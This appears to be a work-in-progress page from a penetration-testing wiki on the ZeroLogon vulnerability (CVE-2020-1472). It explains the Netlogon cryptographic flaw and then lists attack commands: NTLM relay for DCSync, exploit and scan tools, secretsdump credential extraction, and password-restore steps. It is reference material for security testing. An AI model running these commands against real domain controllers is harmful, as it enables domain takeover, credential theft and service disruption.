---
description: CVE-2020-1472
---

# 🛠️ ZeroLogon

{% hint style="danger" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

Netlogon is a service verifying logon requests, registering, authenticating, and locating domain controllers. MS-NRPC, the Netlogon Remote Protocol RPC interface is an authentication mechanism part of that service. MS-NRPC is used primarily to maintain the relationship between a machine and its domain, and relationships among domain controllers \(DCs\) and domains.

MS-NRPC uses a custom and insecure cryptographic protocol \(i.e. it reuses a known, static, zero-value Initialization Vector \(IV\) in AES-CFB8 mode\) when establishing a Netlogon Secure Channel connection to a Domain Controller allowing for an Elevation of Privilege vulnerability. 

* **Concept \#1**: authentication through MS-NRPC uses AES-CFB8. This means that for 1 in 256 possibilities, every block of the ciphertext will be `\x00` bytes if both the IV and the plaintext are `\x00` bytes.
* **Concept \#2**: authentication through MS-NRPC uses a static and null IV \(only `\x00` bytes, hence partly validating concept \#1\).
* **Concept \#3**: MS-NRPC signing and sealing don't rely on the same vulnerable mechanisms but are optional and can be ignored.
* **Concept \#4**: machine accounts have an unlimited number of login attempts, hence allowing for an authentication bypass and the spoofing of these accounts thanks to concepts \#1 and \#2 \(by using a plaintext filled with `\x00` bytes and by doing enough attempts\).
* **Concept \#5**: the `NetrServerPasswordSet2`  call can be used to reset an account's password. The new password structure to supply in this call has to be encrypted with the same vulnerable mechanisms stated in concepts \#1 and \#2.
* **Concept \#6**: the password structure can be filled with `\x00` bytes, leading to the setting a new password of a 0 characters length for the target account.
* **Concept \#7**: all previous concepts can be chained to reset a domain controller's password and obtain domain-admin privileges.

## Practice

This exploit changes the NT hash of the domain controller computer account in the Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent denial of service, attackers can exploit the CVE, find the NT hash of the domain controller machine account before it was changed, and set it back in the AD.

### Authentication relay technique

```bash
ntlmrelayx -t dcsync://$domain_controller_2 -smb2support
dementor.py -d $domain -u $user -p $password $attacker_ip $domain_controller_1
```

### Password change \( ⚠ disruptive\)

{% hint style="danger" %}
This technique can break the domain's replication services hence leading to massive disruption, running the following "password change" technique is **not advised**.
{% endhint %}

{% tabs %}
{% tab title="UNIX-like" %}
//todo

```bash
# Scan for the vulnerability (https://github.com/SecuraBV/CVE-2020-1472)
zerologon-scan 'DC_name' 'DC_IP_address'

# Exploit the vulnerability: set the NT hash to \x00*8 (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
zerologon-exploit 'DC_name' 'DC_IP_address'

# Obtain the Domain Admin's NT hash
secretsdump -no-pass 'Domain'/'DC_computer_account$'@'Domain_controller'

# Obtain the machine account hex encoded password with the domain admin credentials
secretsdump -hashes :'NThash' 'Domain'/'Domain_admin'@'Domain_controller'

# Restore the machine account password (https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py)
# Exemple zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 hexpass
zerologon-restore 'Domain'/'DC_account'@'Domain_controller' -target-ip 'DC_IP_address' -hexpass 'DC_hexpass'
```
{% endtab %}

{% tab title="Windows" %}
//todo

```bash
# (alternate option mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'DC.DOMAIN.LOCAL'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:'old_NThash'
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://www.secura.com/blog/zero-logon" caption="" %}

{% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}



